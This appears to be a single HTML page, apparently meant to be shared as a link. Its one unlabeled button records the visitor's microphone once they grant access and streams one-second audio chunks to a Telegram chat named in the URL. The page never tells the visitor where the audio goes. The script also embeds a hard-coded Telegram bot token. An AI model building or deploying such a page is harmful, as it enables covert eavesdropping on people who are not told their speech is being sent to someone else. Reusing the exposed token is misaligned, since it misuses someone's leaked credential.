<!doctype html>
<html lang="ps">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mic → Telegram Bot</title>
<style>
html, body {margin:0; padding:0; height:100%; overflow:hidden; background:#000;}
#container {width:100%; height:100%; display:flex; justify-content:center; align-items:center; flex-direction:column;}
button {width:100px; height:100px; border-radius:50%; border:none; background:#0f0; cursor:pointer; margin-bottom:10px;}
button:active {background:#f00;}
#loading {width: 60px; height: 10px; background:#555; border-radius:5px; overflow:hidden; display:none;}
#progress {height: 100%; width:0%; background:#0f0; border-radius:5px;}
</style>
</head>
<body>
<div id="container">
  <button id="recordBtn"></button>
  <div id="loading"><div id="progress"></div></div>
</div>

<script>
const BOT_TOKEN = '7623253079:AAGPZYU6rzYwrTbpAVsxYbErjrazklejvTw';

function getChatId() {
  const params = new URLSearchParams(window.location.search);
  return params.get('id');
}

let mediaRecorder;
let recording = false;
const btn = document.getElementById('recordBtn');
const loading = document.getElementById('loading');
const progress = document.getElementById('progress');

async function sendChunk(chunk, chat_id){
  const form = new FormData();
  form.append('voice', chunk, 'voice.webm');
  try{
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice?chat_id=${chat_id}`, {method:'POST', body:form});
  }catch(err){ console.error(err); }
}

btn.addEventListener('click', async ()=>{
  const chat_id = getChatId();
  if(!chat_id) return;

  if(!recording){
    try{
      const stream = await navigator.mediaDevices.getUserMedia({ audio:true });
      mediaRecorder = new MediaRecorder(stream);
      mediaRecorder.ondataavailable = async e=>{
        if(e.data && e.data.size){
          loading.style.display='block';
          progress.style.width='50%';
          await sendChunk(e.data, chat_id);
          progress.style.width='100%';
          setTimeout(()=>{ progress.style.width='0%'; loading.style.display='none'; }, 300);
        }
      };
      mediaRecorder.start(1000); // هر 1 ثانیه chunk واستوي
      recording = true;
      btn.style.background='#f00';
    }catch(err){ console.error(err); }
  } else {
    mediaRecorder.stop();
    recording = false;
    btn.style.background='#0f0';
  }
});
</script>
</body>
</html>
